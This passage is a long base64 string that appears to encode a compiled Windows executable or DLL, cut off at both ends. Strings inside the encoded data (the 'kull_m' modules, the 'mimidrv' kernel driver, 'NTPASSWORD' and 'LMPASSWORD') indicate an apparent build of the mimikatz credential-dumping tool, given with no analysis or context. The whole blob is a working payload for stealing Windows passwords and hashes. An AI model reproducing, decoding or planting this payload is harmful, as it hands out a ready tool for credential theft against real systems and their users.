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mQEQDgAAAByZARAPAAAA9JgBEBAAAADMmAEQEQAAAKiYARASAAAAhJgBEBQAAABwmAEQFQAAAFCYARAWAAAALJgBEBcAAAAQmAEQGAAAAAUAAAAGAAAAAQAAAAgAAAAHAAAAAAAAAJySARCYkgEQeJIBEJiSARBgkgEQSJIBEDiSARAkkgEQFJIBEACSARDkkQEQ2JEBEMSRARCwkQEQmJEBEISRARCNRgAQIH4BEPB9ARA1SQAQ5H0BEMR9ARDiRwAQvH0BEJB9ARBpRwAQhH0BEGR9ARDQSwAQVH0BECx9ARBcfgEQLH4BECh+ARAFAAAAYHABEBhGABBJRgAQ3q3A3g7gsAvA/+5Quq3wDVwALwA6ACoAPwAiADwAPgB8AAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBpAG8AYwB0AGwAIAA7ACAARABlAHYAaQBjAGUASQBvAEMAbwBuAHQAcgBvAGwAIAAoADAAeAAlADAAOAB4ACkAIAA6ACAAMAB4ACUAMAA4AHgACgAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBrAGUAcgBuAGUAbABfAGkAbwBjAHQAbAAgADsAIABDAHIAZQBhAHQAZQBGAGkAbABlACAAKAAwAHgAJQAwADgAeAApAAoAAAAAAFwAXAAuAFwAbQBpAG0AaQBkAHIAdgAAAGEAAAAiACUAcwAiACAAcwBlAHIAdgBpAGMAZQAgAHAAYQB0AGMAaABlAGQACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaABfAGcAZQBuAGUAcgBpAGMAUAByAG8AYwBlAHMAcwBPAHIAUwBlAHIAdgBpAGMAZQBGAHIAbwBtAEIAdQBpAGwAZAAgADsAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAAawB1AGwAbABfAG0AXwBwAHIAbwBjAGUAcwBzAF8AZwBlAHQAVgBlAHIAeQBCAGEAcwBpAGMATQBvAGQAdQBsAGUASQBuAGYAbwByAG0AYQB0AGkAbwBuAHMARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAATwBwAGUAbgBQAHIAbwBjAGUAcwBzACAAKAAwA